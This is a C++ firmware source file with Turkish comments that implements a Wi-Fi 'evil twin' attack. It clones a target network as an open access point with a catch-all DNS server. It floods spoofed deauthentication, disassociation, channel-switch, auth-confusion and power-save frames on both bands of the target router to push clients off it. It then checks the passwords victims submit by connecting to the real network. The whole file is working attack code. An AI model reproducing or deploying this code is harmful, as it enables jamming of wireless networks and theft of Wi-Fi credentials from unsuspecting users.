#include <WiFi.h>
#include "platform_compat.h"
#include "evil_twin.h"
#include "board_hal.h"
#include "definitions.h"
#include "passwords.h"
#include "types.h"
#include "web_interface.h"

// num_networks: web_interface.cpp'de tanımlı
extern int num_networks;

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
bool    evil_twin_active  = false;
String  evil_twin_ssid    = "";
int     evil_twin_clients = 0;
int     evil_twin_channel = 1;
uint8_t evil_twin_bssid[6] = {0};

// ─── Çift bant eşlikçi değişkenleri ──────────────────────────────────────────
bool    evil_twin_has_companion = false;
uint8_t evil_twin_bssid2[6]    = {0};
int     evil_twin_channel2     = 1;

// ─── WPS PBC durum değişkenleri (BW16'da WPS desteklenmiyor — stub) ──────────
bool et_wps_pbc_running  = false;
bool et_wps_pbc_found    = false;
char et_wps_pbc_pass[65] = {0};

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static DNSServer      dns_server;
static const uint8_t  DNS_PORT = 53;
static deauth_frame_t et_frame;

static unsigned long et_last_retrack = 0;
static unsigned long et_last_csa     = 0;
static unsigned long et_last_led     = 0;
static unsigned long et_last_deauth  = 0;
static bool          et_led_state    = false;
static uint8_t       et_last_client[6] = {0};
static unsigned long et_wps_stop_at = 0;

// ─── Yardımcı: aynı modeme ait eşlikçi bant ağını bul ────────────────────────
static int et_find_companion(const uint8_t *primary_bssid, int primary_ch) {
  bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
  for (int i = 0; i < num_networks; i++) {
    int ch = WiFi_channel_scan(i);
    if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue;
    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i;
  }
  return -1;
}

// ─── WPS PBC — BW16'da desteklenmiyor ────────────────────────────────────────
void et_start_wps_pbc() {}
void et_stop_wps_pbc()  {}

static void et_wps_pbc_loop() {}

// ─── Evil Twin CSA Beacon ─────────────────────────────────────────────────────
IRAM_ATTR static void et_send_csa_beacon() {
  const uint8_t *bssid    = evil_twin_bssid;
  uint8_t        ssid_len = (uint8_t)evil_twin_ssid.length();
  uint8_t        channel  = (uint8_t)evil_twin_channel;
  bool           is5ghz   = IS_5GHZ_CHANNEL(evil_twin_channel);

  uint8_t csa_channel = is5ghz ? 0 : 14;
  uint8_t op_class    = is5ghz ? get_5ghz_op_class(channel) : 81;

  uint8_t buf[160];
  uint8_t *p = buf;

  *p++ = 0x80; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  memset(p, 0xFF, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;

  memset(p, 0, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x11; *p++ = 0x04;

  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, evil_twin_ssid.c_str(), ssid_len); p += ssid_len;

  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01; *p++ = csa_channel; *p++ = 0x01;

  *p++ = 0x3C; *p++ = 0x04;
  *p++ = 0x01; *p++ = op_class; *p++ = csa_channel; *p++ = 0x01;

  *p++ = 0x28; *p++ = 0x06;
  *p++ = 0x01; *p++ = 0x01;
  *p++ = 0xFF; *p++ = 0x7F;
  *p++ = 0x00; *p++ = 0x00;

  int flen = (int)(p - buf);
  for (int i = 0; i < 10; i++) {
    hal_wifi_80211_tx(HAL_IF_AP, buf, flen);
    delayMicroseconds(400);
  }
}

// ─── Auth confusion ───────────────────────────────────────────────────────────
IRAM_ATTR static void et_send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[30];
  uint8_t *p = buf;
  *p++ = 0xB0; *p++ = 0x00;
  *p++ = 0x3A; *p++ = 0x01;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x02; *p++ = 0x00;
  *p++ = 0x0D; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── NULL data power-save spoof ───────────────────────────────────────────────
IRAM_ATTR static void et_send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[24];
  uint8_t *p = buf;
  *p++ = 0x48; *p++ = 0x11;
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── Proaktif deauth ──────────────────────────────────────────────────────────
IRAM_ATTR static void et_send_proactive_deauth() {
  hal_reapply_wifi_power(et_wps_pbc_running);

  static const uint8_t zero[6]    = {0};
  static const uint8_t reasons[4] = {7, 6, 2, 3};
  deauth_frame_t f = et_frame;

  memset(f.station, 0xFF, 6);
  for (int r = 0; r < 4; r++) {
    f.frame_control[0] = 0xC0; f.reason = reasons[r];
    for (int i = 0; i < 8; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
    f.frame_control[0] = 0xA0;
    for (int i = 0; i < 8; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
  }

  if (evil_twin_has_companion) {
    deauth_frame_t fc = make_deauth_frame();
    memcpy(fc.access_point, evil_twin_bssid2, 6);
    memcpy(fc.sender,       evil_twin_bssid2, 6);
    memset(fc.station, 0xFF, 6);
    for (int r = 0; r < 4; r++) {
      fc.frame_control[0] = 0xC0; fc.reason = reasons[r];
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
      fc.frame_control[0] = 0xA0;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
    }
  }

  if (memcmp(et_last_client, zero, 6) != 0) {
    memcpy(f.station, et_last_client, 6);
    for (int r = 0; r < 4; r++) {
      f.frame_control[0] = 0xC0; f.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
      f.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
    }

    deauth_frame_t f_rev = make_deauth_frame();
    memcpy(f_rev.access_point, evil_twin_bssid, 6);
    memcpy(f_rev.sender,       et_last_client,  6);
    memcpy(f_rev.station,      evil_twin_bssid, 6);
    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
    for (int i = 0; i < 10; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
    for (int i = 0; i < 10; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));

    et_send_auth_confusion(evil_twin_bssid, et_last_client);
    et_send_null_powerdown(evil_twin_bssid, et_last_client);

    if (evil_twin_has_companion) {
      deauth_frame_t fc2 = make_deauth_frame();
      memcpy(fc2.access_point, evil_twin_bssid2, 6);
      memcpy(fc2.sender,       evil_twin_bssid2, 6);
      memcpy(fc2.station,      et_last_client,   6);
      for (int r = 0; r < 4; r++) {
        fc2.frame_control[0] = 0xC0; fc2.reason = reasons[r];
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
          hal_wifi_80211_tx(HAL_IF_AP, &fc2, sizeof(fc2));
        fc2.frame_control[0] = 0xA0;
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
          hal_wifi_80211_tx(HAL_IF_AP, &fc2, sizeof(fc2));
      }
      deauth_frame_t fc2_rev = make_deauth_frame();
      memcpy(fc2_rev.access_point, evil_twin_bssid2, 6);
      memcpy(fc2_rev.sender,       et_last_client,   6);
      memcpy(fc2_rev.station,      evil_twin_bssid2, 6);
      fc2_rev.frame_control[0] = 0xC0; fc2_rev.reason = 3;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc2_rev, sizeof(fc2_rev));
      fc2_rev.frame_control[0] = 0xA0; fc2_rev.reason = 8;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc2_rev, sizeof(fc2_rev));

      et_send_auth_confusion(evil_twin_bssid2, et_last_client);
      et_send_null_powerdown(evil_twin_bssid2, et_last_client);
    }
  }
}

// ─── ET Sniffer ───────────────────────────────────────────────────────────────
IRAM_ATTR static void et_sniffer_cb(const uint8_t *frame, uint16_t len) {
  if (len < sizeof(mac_hdr_t)) return;
  const wifi_packet_t *pkt = (const wifi_packet_t *)frame;
  const mac_hdr_t     *hdr = &pkt->hdr;

  if (memcmp(hdr->dest, et_frame.sender, 6) != 0) return;

  memcpy(et_frame.station, hdr->src, 6);
  memcpy(et_last_client,   hdr->src, 6);

  static const uint8_t reasons[] = {7, 6, 2, 3};

  for (int r = 0; r < 4; r++) {
    et_frame.frame_control[0] = 0xC0;
    et_frame.reason = reasons[r];
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
    et_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
  }

  {
    deauth_frame_t f_rev = make_deauth_frame();
    memcpy(f_rev.access_point, evil_twin_bssid, 6);
    memcpy(f_rev.sender,       hdr->src,         6);
    memcpy(f_rev.station,      evil_twin_bssid,  6);
    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
    for (int i = 0; i < 10; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
    for (int i = 0; i < 10; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
  }

  memset(et_frame.station, 0xFF, 6);
  et_frame.frame_control[0] = 0xC0; et_frame.reason = 3;
  for (int i = 0; i < 6; i++)
    hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
  et_frame.frame_control[0] = 0xA0;
  for (int i = 0; i < 6; i++)
    hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));

  if (evil_twin_has_companion) {
    deauth_frame_t fc = make_deauth_frame();
    memcpy(fc.access_point, evil_twin_bssid2, 6);
    memcpy(fc.sender,       evil_twin_bssid2, 6);
    memcpy(fc.station,      hdr->src,         6);
    for (int r = 0; r < 4; r++) {
      fc.frame_control[0] = 0xC0; fc.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
      fc.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
    }
    memset(fc.station, 0xFF, 6);
    fc.frame_control[0] = 0xC0; fc.reason = 3;
    for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
    fc.frame_control[0] = 0xA0;
    for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &fc, sizeof(fc));
  }

  memcpy(et_frame.station, hdr->src, 6);
  et_frame.frame_control[0] = 0xC0;
  et_frame.reason = 1;

  BLINK_LED(1, 10);
}

// ─── Sniffer başlat ───────────────────────────────────────────────────────────
static void et_start_sniffer() {
  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(et_sniffer_cb);
}

// ─── Evil Twin başlat ─────────────────────────────────────────────────────────
void start_evil_twin(int wifi_number) {
  evil_twin_ssid    = WiFi_SSID_cstr(wifi_number);
  evil_twin_channel = WiFi_channel_scan(wifi_number);
  memcpy(evil_twin_bssid, WiFi_BSSID_scan(wifi_number), 6);
  evil_twin_clients = 0;
  evil_twin_active  = true;
  et_last_retrack   = millis();
  et_last_csa       = millis();

  evil_twin_has_companion = false;
  int comp_idx = et_find_companion(evil_twin_bssid, evil_twin_channel);
  if (comp_idx >= 0) {
    evil_twin_has_companion = true;
    evil_twin_channel2      = WiFi_channel_scan(comp_idx);
    memcpy(evil_twin_bssid2, WiFi_BSSID_scan(comp_idx), 6);
    DEBUG_PRINTF("ET Cift bant: eslıkci kanal %d %s\n",
      evil_twin_channel2,
      IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)");
  }

  DEBUG_PRINT("Evil Twin: ");
  DEBUG_PRINT(evil_twin_ssid);
  DEBUG_PRINTF(" Kanal %d %s%s\n",
    evil_twin_channel,
    IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)",
    evil_twin_has_companion ? " + eslıkci bant" : "");

  hal_wifi_set_promiscuous(false);

  et_frame          = make_deauth_frame();
  et_frame.reason   = 1;
  memcpy(et_frame.access_point, evil_twin_bssid, 6);
  memcpy(et_frame.sender,       evil_twin_bssid, 6);

  // AmebaD'de softAP() yok — WiFi_softAP() platform_compat.h'deki wrapper'ı çağırır
  WiFi_softAP(evil_twin_ssid.c_str(), "", evil_twin_channel);
  delay(150);
  apply_max_performance();

  dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  et_start_sniffer();
}

// ─── Şifre testi ─────────────────────────────────────────────────────────────
bool evil_twin_test_password(const String &password) {
  DEBUG_PRINT("Sifre deneniyor: ");
  DEBUG_PRINTLN(password);

  hal_wifi_set_promiscuous(false);

  // AmebaD WiFi.begin() sadece (ssid, pass) imzasını destekler
  WiFi.begin((char*)evil_twin_ssid.c_str(), password.c_str());

  unsigned long t = millis();
  bool connected  = false;
  while (millis() - t < ET_TEST_TIMEOUT_MS) {
    wl_status_t s = (wl_status_t)WiFi.status();
    if (s == WL_CONNECTED)      { connected = true; break; }
    if (s == WL_CONNECT_FAILED) break;
    delay(80);
    web_interface_handle_client();
    dns_server.processNextRequest();
  }

  WiFi.disconnect();
  apply_max_performance();

  if (!connected) {
    delay(200);
    et_start_sniffer();
  }
  return connected;
}

// ─── Hedef yeniden bulma ───────────────────────────────────────────────────────
static void et_retrack() {
  DEBUG_PRINT("ET Hedef taraniyor: ");
  DEBUG_PRINTLN(evil_twin_ssid);

  hal_wifi_set_promiscuous(false);

  int n = WiFi_scanNetworks_ex();
  bool found_primary   = false;
  bool found_companion = false;

  for (int i = 0; i < n; i++) {
    if (!found_primary &&
        String(WiFi_SSID_cstr(i)) == evil_twin_ssid &&
        memcmp(WiFi_BSSID_scan(i), evil_twin_bssid, 3) == 0) {

      int  new_ch  = WiFi_channel_scan(i);
      bool changed = (new_ch != evil_twin_channel) ||
                     (memcmp(WiFi_BSSID_scan(i), evil_twin_bssid, 6) != 0);
      if (changed) {
        evil_twin_channel = new_ch;
        memcpy(evil_twin_bssid, WiFi_BSSID_scan(i), 6);
        memcpy(et_frame.access_point, evil_twin_bssid, 6);
        memcpy(et_frame.sender,       evil_twin_bssid, 6);
        WiFi_softAP(evil_twin_ssid.c_str(), "", evil_twin_channel);
        apply_max_performance();
        DEBUG_PRINTF("ET birincil yeni kanal: %d %s\n",
          evil_twin_channel,
          IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)");
      }
      found_primary = true;
    }

    if (!found_companion && evil_twin_has_companion &&
        memcmp(evil_twin_bssid, WiFi_BSSID_scan(i), 3) == 0 &&
        IS_5GHZ_CHANNEL(WiFi_channel_scan(i)) != IS_5GHZ_CHANNEL(evil_twin_channel)) {

      int new_ch2 = WiFi_channel_scan(i);
      if (new_ch2 != evil_twin_channel2 ||
          memcmp(WiFi_BSSID_scan(i), evil_twin_bssid2, 6) != 0) {
        evil_twin_channel2 = new_ch2;
        memcpy(evil_twin_bssid2, WiFi_BSSID_scan(i), 6);
        DEBUG_PRINTF("ET eslıkci yeni kanal: %d %s\n",
          evil_twin_channel2,
          IS_5GHZ_CHANNEL(evil_twin_channel2) ? "(5GHz)" : "(2.4GHz)");
      }
      found_companion = true;
    }

    if (found_primary && (!evil_twin_has_companion || found_companion)) break;
  }
  WiFi_scanDelete();
  et_start_sniffer();
}

// ─── Evil Twin döngüsü ────────────────────────────────────────────────────────
void evil_twin_loop() {
  if (!evil_twin_active) return;

  dns_server.processNextRequest();
  // AmebaD SDK'da softAPgetStationNum() yok; istemci sayısı sniffer ile izlenir
  evil_twin_clients = 0;

  et_wps_pbc_loop();

  if (et_wps_stop_at && millis() >= et_wps_stop_at) {
    et_wps_stop_at = 0;
    stop_evil_twin();
    return;
  }

  unsigned long now = millis();

  if (now - et_last_csa >= CSA_INTERVAL_MS) {
    et_last_csa = now;
    et_send_csa_beacon();
  }

  if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
    et_last_deauth = now;
    et_send_proactive_deauth();
  }

  if (!et_wps_pbc_running && (now - et_last_retrack >= RETRACK_INTERVAL_MS)) {
    et_last_retrack = now;
    et_retrack();
  }

#ifdef LED
  if (now - et_last_led >= 1000) {
    et_last_led = now;
    et_led_state = !et_led_state;
    if (evil_twin_clients > 0) {
      et_led_state ? led_on() : led_off();
    } else {
      led_off();
    }
  }
#endif
}

// ─── Evil Twin durdur ─────────────────────────────────────────────────────────
void stop_evil_twin() {
  if (!evil_twin_active) return;
  evil_twin_active = false;

  et_stop_wps_pbc();
  hal_wifi_set_promiscuous(false);
  dns_server.stop();

  WiFi_softAP(AP_SSID, AP_PASS);
  apply_max_performance();

  evil_twin_ssid          = "";
  evil_twin_clients       = 0;
  evil_twin_has_companion = false;
  memset(evil_twin_bssid2, 0, 6);
  evil_twin_channel2      = 1;
  memset(et_last_client, 0, 6);
  led_off();

  DEBUG_PRINTLN("Evil Twin durduruldu.");
}
